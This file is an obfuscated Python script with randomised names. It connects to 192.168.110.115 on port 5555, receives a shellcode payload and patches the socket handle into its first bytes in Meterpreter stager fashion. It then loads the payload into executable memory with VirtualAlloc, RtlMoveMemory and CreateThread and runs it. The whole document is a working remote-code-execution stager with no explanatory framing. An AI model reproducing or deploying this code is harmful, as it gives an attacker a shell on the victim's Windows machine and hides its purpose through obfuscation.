import struct, socket, binascii, ctypes, random, time

gdMDAafejF, uoGrBDoTUKFUZD = None, None


def aMtaLkxtTKveGe():
    try:
        global uoGrBDoTUKFUZD
        uoGrBDoTUKFUZD = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        uoGrBDoTUKFUZD.connect(('192.168.110.115', 5555))
        UkAYrkaN = struct.pack('<i', uoGrBDoTUKFUZD.fileno())
        l = struct.unpack('<i', str(uoGrBDoTUKFUZD.recv(4)))[0]
        tmSmlFmGBoZ = "     "
        while len(tmSmlFmGBoZ) < l: tmSmlFmGBoZ += uoGrBDoTUKFUZD.recv(l)
        nwQHEulryGQj = ctypes.create_string_buffer(tmSmlFmGBoZ, len(tmSmlFmGBoZ))
        nwQHEulryGQj[0] = binascii.unhexlify('BF')
        for i in xrange(4): nwQHEulryGQj[i + 1] = UkAYrkaN[i]
        return nwQHEulryGQj
    except:
        return None


def OoMUvBoSbMT(wubKepxsIE):
    if wubKepxsIE != None:
        CmpEnySL = bytearray(wubKepxsIE)
        GteEwokU = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(CmpEnySL)),
                                                       ctypes.c_int(0x3000), ctypes.c_int(0x40))
        ctypes.windll.kernel32.VirtualLock(ctypes.c_int(GteEwokU), ctypes.c_int(len(CmpEnySL)))
        sUYFakxZdoYof = (ctypes.c_char * len(CmpEnySL)).from_buffer(CmpEnySL)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(GteEwokU), sUYFakxZdoYof, ctypes.c_int(len(CmpEnySL)))
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(GteEwokU),
                                                 ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


gdMDAafejF = aMtaLkxtTKveGe()
OoMUvBoSbMT(gdMDAafejF)
